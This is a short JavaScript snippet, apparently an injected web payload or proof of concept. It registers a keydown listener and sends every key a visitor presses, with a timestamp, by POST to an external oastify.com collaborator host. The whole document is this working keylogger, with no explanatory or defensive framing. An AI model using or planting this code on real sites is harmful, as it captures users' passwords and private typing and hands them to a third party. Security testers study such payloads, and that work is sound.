document.addEventListener('keydown', function(e) {
    fetch('https://ztw0crqnl8um38ma3dqe8ttu3l9cx4usj.oastify.com/log', { 
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ key: e.key, time: Date.now() })
    });
});